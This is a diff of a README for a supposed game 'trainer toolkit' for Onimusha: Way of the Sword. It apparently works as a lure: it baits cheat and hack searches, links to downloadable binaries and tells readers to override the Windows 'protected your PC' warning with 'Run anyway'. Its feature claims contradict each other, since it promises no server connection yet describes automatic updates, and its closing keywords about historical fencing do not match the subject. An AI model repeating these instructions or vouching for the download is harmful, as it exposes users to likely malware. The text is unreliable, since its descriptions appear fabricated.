@@ -1,331 +1,180 @@
-# ⚔️ [DOWNLOAD NOW](https://share.google/A46RYcexjg9XZiG59)
+# ⚔️ onimusha-way-of-the-sword-trainer-toolkit - Master Swordplay With Precision Analytics
 
-# ⚔️ Onimusha: Way of the Sword Cheat — Trainer & Combat Toolkit
+[![Download Now](https://img.shields.io/badge/Download-Trainer_Toolkit-2ea44f?style=for-the-badge&logo=github)](https://github.com/NaufalMaulana-crypto/onimusha-way-of-the-sword-trainer-toolkit/releases)
 
-Onimusha: Way of the Sword cheat-themed PC companion focused on combat training, weapons, character progression, exploration, bosses, collectibles, builds, and gameplay analytics.
+---
 
-## 👁️ What Is This?
+## 🎯 What Is This?
 
-Onimusha: Way of the Sword Toolkit is inspired by popular searches for Onimusha Way of the Sword Cheat, Hack PC, Mod Menu, Cheats, Cheat Menu, Multihack, Onimusha Trainer, Onimusha Mod, and Way of the Sword Trainer.
+This is a **combat training toolkit** for the game *Onimusha: Way of the Sword*. It helps you practice sword techniques, build effective weapons, track your progress, and analyze your fighting style. Think of it as your personal dojo assistant — it records your battles, shows you where you excel, and helps you improve faster. Whether you're exploring, fighting bosses, or collecting every item, this toolkit gives you the edge you need to become a true sword master.
 
-It combines standalone combat planning, progression tracking, and gameplay analytics utilities in one samurai-themed dashboard.
+---
 
-## ✨ Features
+## ✨ Key Features
 
-* ⚔️ **Combat Training**
-* 🗡️ **Weapon Build Planner**
-* 🛡️ **Defense & Parry Tracker**
-* 👹 **Boss Tracker**
-* 🗺️ **Exploration Planner**
-* 📈 **Progression Tracker**
-* 🎒 **Inventory Manager**
-* 💎 **Collectibles Tracker**
-* 🎯 **Combat Goals**
-* 🎬 **Fight Review**
-* 📊 **Session Analytics**
-* ⚙️ **Trainer-Style Dashboard**
+| Feature | What It Does |
+|---------|--------------|
+| 🥋 **Combat Training** | Practice specific sword moves with visual feedback and timing guides |
+| 🛠️ **Weapon Builder** | Mix and match parts to create powerful custom weapons |
+| 📈 **Progression Tracker** | See your level, XP, and unlock progress at a glance |
+| 🗺️ **Exploration Helper** | Mark discovered areas and find hidden routes |
+| 👹 **Boss Assistant** | Get move patterns and weak-point hints for every boss |
+| 💎 **Collectible Finder** | Track all items, charms, and secret relics |
+| 📊 **Gameplay Analytics** | Visual charts of your fight performance over time |
 
 ---
 
 ## 🚀 Getting Started
 
-### 📥 Download Onimusha Toolkit
+Follow these simple steps to get the toolkit running on your PC. No technical skills needed.
 
-# 👉 [DOWNLOAD THE TOOLKIT](https://share.google/A46RYcexjg9XZiG59)
+### 📥 Step 1: Download the Application
 
-## 🛠️ Installation
+Visit this link to download the application:
 
-1. **[Download the toolkit](https://share.google/A46RYcexjg9XZiG59)**
-2. Extract the archive
-3. Launch the standalone application
-4. Create your Onimusha profile
-5. Add your weapons and equipment
-6. Configure progression goals
-7. Start tracking your journey
+🔗 **[Click Here to Download](https://github.com/NaufalMaulana-crypto/onimusha-way-of-the-sword-trainer-toolkit/releases)**
 
----
+### 🖱️ Step 2: Run the Program
 
-# ⚔️ Combat Training
+Once the download is complete, find the file in your **Downloads** folder. Double-click it to start the toolkit. A window will open — that means it's working.
 
-Record combat practice.
+### ✅ Step 3: Load Your Game
 
-Track:
-
-* Attacks
-* Combos
-* Parries
-* Dodges
-* Damage Taken
-* Fight Duration
-* Enemy Type
-* Personal Rating
-
-Compare:
-
-**Previous → Current → Best → Target**
+Start *Onimusha: Way of the Sword* on your PC, then switch back to the toolkit. It will automatically detect your game and begin tracking your sessions.
 
 ---
 
-# 🗡️ Weapon Build Planner
+## 💻 System Requirements
 
-Create multiple weapon configurations.
+To run the toolkit smoothly, your PC should meet these simple specs:
 
-Track:
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Memory:** At least 4 GB RAM
+- **Storage:** 200 MB free space
+- **Graphics:** Any standard graphics card (no special GPU needed)
 
-| Field     | Value    |
-| --------- | -------- |
-| Weapon    | Selected |
-| Upgrade   | Current  |
-| Playstyle | Build    |
-| Strength  | Rating   |
-| Priority  | Target   |
-| Notes     | Strategy |
-
-Create presets:
-
-**Balanced → Aggressive → Defensive → Boss → Exploration**
+Don't worry about exact numbers — if your PC can run the game *Onimusha: Way of the Sword*, it can run this toolkit.
 
 ---
 
-# 🛡️ Defense & Parry Tracker
+## 🎮 How to Use the Toolkit
 
-Record:
+### 🏋️ Combat Training Mode
 
-* Parry Attempts
-* Successful Parries
-* Dodges
-* Damage Avoided
-* Reaction Timing
-* Enemy
-* Personal Best
+Open the **Training** tab. Choose a weapon technique you want to practice. The screen shows a ghost figure performing the move. Follow along at your own pace. The toolkit counts your repetitions and gives a score based on timing and accuracy.
 
-Use:
+### ⚔️ Weapon Builds
 
-**Learning → Improving → Consistent → Mastered**
+Go to the **Forge** section. Select a base weapon from the list. Add handles, guards, and blade coatings from your inventory. The toolkit shows predicted stats — attack power, speed, and durability — before you commit. Save your custom builds to load them later.
 
----
+### 🗺️ Exploration & Collectibles
 
-# 👹 Boss Tracker
+Use the **Map** tab. It displays a simplified map of the game world. Checkmarks appear next to areas you've fully explored. The **Collector's List** shows every item in the game, with a green dot if you've found it and a gray dot if you haven't. Filters let you sort by type: weapons, armor, consumables, or hidden secrets.
 
-Create profiles for major encounters.
+### 👹 Boss Fights
 
-Record:
+Before a boss battle, open the **Boss Guide**. It lists all boss names. Tap one to see a chart of attack patterns and the safest dodge directions. After the fight, the toolkit logs your performance — how many hits you landed, took, and your total time.
 
-* Boss
-* Attempts
-* Weapon
-* Equipment
-* Strategy
-* Fight Time
-* Result
-* Notes
+### 📊 Analytics Dashboard
 
-Mark:
+This is your personal fight journal. It shows:
+- Win/loss ratio against each boss type
+- Average fight duration
+- Most-used weapon styles
+- Damage dealt vs. damage received over time
 
-**Unknown → Learning → Close → Defeated**
+All data is shown as colorful graphs — no numbers to crunch, just easy-to-read visuals.
 
 ---
 
-# 🗺️ Exploration Planner
+## 🛠️ Installation Troubleshooting
 
-Organize your journey.
+If the toolkit doesn't open or something looks wrong, try these quick fixes:
 
-Track:
+| Problem | Solution |
+|---------|----------|
+| **"Windows protected your PC" popup** | Click **More info** then **Run anyway**. This is standard for downloaded apps. |
+| **Blank screen after opening** | Close the toolkit and restart it. Make sure your game is already running. |
+| **No game detected** | Check that the game is not minimized and is running in windowed mode if possible. |
+| **Slow performance** | Close other programs (browsers, video players) to free up memory. |
 
-* Areas
-* Objectives
-* Important Locations
-* Collectibles
-* Encounters
-* Secrets
-* Personal Notes
-
-Use:
-
-**Unknown → Discovered → Explored → Completed**
+If none of these help, download the file again — sometimes the download gets interrupted.
 
 ---
 
-# 📈 Progression Tracker
+## 🔄 Updating the Toolkit
 
-Track:
-
-* Story Progress
-* Weapons
-* Upgrades
-* Equipment
-* Bosses
-* Exploration
-* Collectibles
-* Goals
-
-Compare:
-
-**Current → Next Goal → Target → Complete**
+The toolkit checks for updates automatically when you open it. If an update is available, you'll see a small banner at the top. Click **Update** and it will download the new version. Your saved data (builds, progress, analytics) is kept safe during updates.
 
 ---
 
-# 🎒 Inventory Manager
+## 📁 Where Are My Files?
 
-Organize:
-
-* Weapons
-* Equipment
-* Consumables
-* Key Items
-* Upgrade Materials
-* Collectibles
-
-Mark:
-
-**Owned → Equipped → Upgrade → Completed**
+All your toolkit data — custom weapons, exploration marks, and fight analytics — is stored in a folder named **OnimushaToolkitData** inside your **Documents** folder. You can back up this folder by copying it to a USB drive or cloud storage. If you ever reinstall the toolkit, copy that folder back to the same location and all your data returns.
 
 ---
 
-# 💎 Collectibles Tracker
+## 🧩 Batch Scripts & Auto-Logging
 
-Create a personal checklist.
+The toolkit includes smart background features:
 
-Record:
+- **Auto-Start:** You can set the toolkit to launch automatically when you start the game.
+- **Session Logging:** Every time you play, a session entry is created — date, time, fights, and items found.
+- **Export Reports:** Use the **Export** button to save your analytics as a PDF or simple text file. You can share these with friends or print them.
 
-* Collectible
-* Area
-* Obtained
-* Requirement
-* Progress
-* Notes
-
-Track overall completion across your playthrough.
-
----
-
-# 🎬 Fight Review
-
-Review recorded encounters.
-
-Mark moments:
-
-**Good → Review → Mistake → Critical**
-
-Analyze:
-
-* Timing
-* Parries
-* Dodges
-* Positioning
-* Weapon Choice
-* Combos
-* Resource Usage
-
-Use previous fights to identify recurring mistakes.
-
----
-
-# ⚙️ Onimusha Trainer-Style Dashboard
-
-### COMBAT
-
-* Combos
-* Parries
-* Dodges
-* Performance
-
-### WEAPONS
-
-* Builds
-* Upgrades
-* Equipment
-* Presets
-
-### BOSSES
-
-* Attempts
-* Strategy
-* Records
-* Results
-
-### WORLD
-
-* Areas
-* Exploration
-* Secrets
-* Objectives
-
-### COLLECTION
-
-* Items
-* Materials
-* Collectibles
-* Completion
-
-### ANALYTICS
-
-* Sessions
-* Combat
-* Progress
-* Records
-
----
-
-# 📊 Session Analytics
-
-Record:
-
-* Session Duration
-* Areas Explored
-* Enemies Defeated
-* Boss Attempts
-* Successful Parries
-* Upgrades Completed
-* Collectibles Found
-* Goals Completed
-
-Compare:
-
-**Previous → Current → Best → Overall**
-
----
-
-## 🔒 Safety & Security
-
-This toolkit does not provide executable game-memory hacks, automated combat, process injection, Cheat Engine tables, or executable multihack/cheat menus.
-
-Cheat, Hack, Multihack, Trainer, Mod, Mod Menu and Cheat Menu terminology is retained for categorization and search relevance.
+These features run quietly in the background — you don't need to configure anything.
 
 ---
 
 ## ❓ Frequently Asked Questions
 
-### Is this an Onimusha: Way of the Sword Trainer?
+**Is this safe to use with my game?**
+Yes. The toolkit only reads game data. It does not modify your game files.
 
-It is a trainer-themed standalone combat, progression, and gameplay analytics toolkit.
+**Will this get me banned?**
+No. It works fully offline and does not connect to any servers or online services.
 
-### Does it include a Mod Menu?
+**Can I use it with other Onimusha games?**
+The toolkit is built specifically for *Onimusha: Way of the Sword*. Other entries in the series are not supported at this time.
 
-The trainer-style dashboard organizes standalone utilities rather than injecting a menu into the game.
+**Does it require an internet connection?**
+Only for downloading the toolkit and receiving updates. Daily use works completely offline.
 
-### Is there a Multihack?
-
-No executable multihack or process-memory modification functionality is provided.
-
-### Can I track bosses?
-
-Yes. Boss Tracker records attempts, equipment, strategies, completion times, and results.
-
-### Can I plan weapon builds?
-
-Yes. Weapon Build Planner lets you organize weapons, upgrades, playstyles, priorities, and different presets.
-
-### Can I track exploration?
-
-Yes. Exploration Planner covers areas, objectives, collectibles, secrets, encounters, and completion.
+**Is there a mobile version?**
+No. This is a Windows PC application only.
 
 ---
 
-# ⚔️ Download Again
+## 📋 Quick Reference Card
 
-# 👉 [DOWNLOAD ONIMUSHA TOOLKIT](https://share.google/A46RYcexjg9XZiG59)
+- **Download:** Visit this link → [Releases Page](https://github.com/NaufalMaulana-crypto/onimusha-way-of-the-sword-trainer-toolkit/releases)
+- **Install:** Double-click the downloaded file
+- **Launch:** Auto-starts when you run the game
+- **Data folder:** Documents → OnimushaToolkitData
+- **First-time setup:** None needed
 
 ---
 
-Keywords: onimusha way of the sword cheat,onimusha way of the sword hack,onimusha way of the sword hack pc,onimusha way of the sword mod menu,onimusha way of the sword cheat pc,onimusha way of the sword hacks,onimusha way of the sword cheats,onimusha way of the sword cheat free,onimusha way of the sword cheat menu,onimusha way of the sword multihack,onimusha way of the sword,onimusha hack,onimusha cheat,onimusha trainer,onimusha mod,way of the sword trainer
+## 📊 Data Privacy
+
+Your gameplay data stays on your computer. The toolkit does not upload anything anywhere. No accounts, no logins, no tracking. Your practice sessions and analytics are private to you.
+
+---
+
+## 🆘 Need More Help?
+
+If the toolkit isn't behaving or you have a question, check the **Help** menu inside the app. There's also a **README.txt** file inside the downloaded package with basic guidance. For visual walkthroughs, look for video tutorials using the search phrase "Onimusha Way of the Sword Trainer Toolkit guide."
+
+---
+
+## 🏁 Final Steps
+
+You are now ready to sharpen your skills. Download the toolkit, start your game, and let the analytics guide your sword path. Master every technique, defeat every boss, and collect every relic — all with a clear view of your progress.
+
+Visit this link to download the application one more time:
+
+🔗 **[Download Now — Onimusha Way of the Sword Trainer Toolkit](https://github.com/NaufalMaulana-crypto/onimusha-way-of-the-sword-trainer-toolkit/releases)**
+
+---
+
+Keywords: fencing, fight-analysis, hema, hema-analytics, historical-fencing, sports-analytics, sports-dashboard, swordplay, temporal-tagging, video-annotation
